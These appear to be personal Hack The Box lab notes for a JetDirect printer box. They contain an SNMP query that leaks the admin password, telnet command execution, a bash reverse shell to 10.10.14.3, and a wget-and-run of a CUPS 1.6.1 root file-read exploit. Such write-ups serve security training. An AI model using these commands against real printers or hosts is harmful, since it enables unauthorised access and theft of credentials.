# enum
```
nmap -Pn -sVC -T4 htb
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```

https://www.exploit-db.com/exploits/22319

# exploit
```
snmpget -v2c -c  public htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
``` 
	iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
	33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
The output is in hex format

Result of convertion : 
```
P@ssw0rd@123!!123
```

## connection 
$ 
```
nc htb 23
```
```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec ls
telnet.py
user.txt
> exec cat user.txt
29acd80ba977dbaeef6f3672fb30c132
```

# foothold
get a good shell
	>
```bash
exec bash -c 'bash -i >& /dev/tcp/10.10.14.3/1234 0>&1'
```
$
```bash
ss -tunl
```      
	tcp    LISTEN  0       4096         127.0.0.1:631         0.0.0.0:*
there are a tcp port open in intern
$
```bash
nc 127.0.0.1 631 -v
```
	Connection to 127.0.0.1 631 port [tcp/ipp] succeeded!
	id
	HTTP/1.0 400 Bad Request
	Date: Fri, 22 Mar 2024 15:17:50 GMT
	Server: CUPS/1.6
	Content-Type: text/html; charset=utf-8
	Content-Length: 346
	
	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
	<HTML>
	<HEAD>
	        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	        <TITLE>Bad Request - CUPS v1.6.1</TITLE>
	        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
	</HEAD>
	<BODY>
	<H1>Bad Request</H1>
	<P></P>
	</BODY>
	</HTML>

There is an exploit for *CUPS v1.6.1*
https://github.com/p1ckzi/CVE-2012-5519/blob/main/README.md

# PrivEsc
$
```
wget http://10.10.14.3/cups-root-file-read.sh
bash cups-root-file-read.sh
```
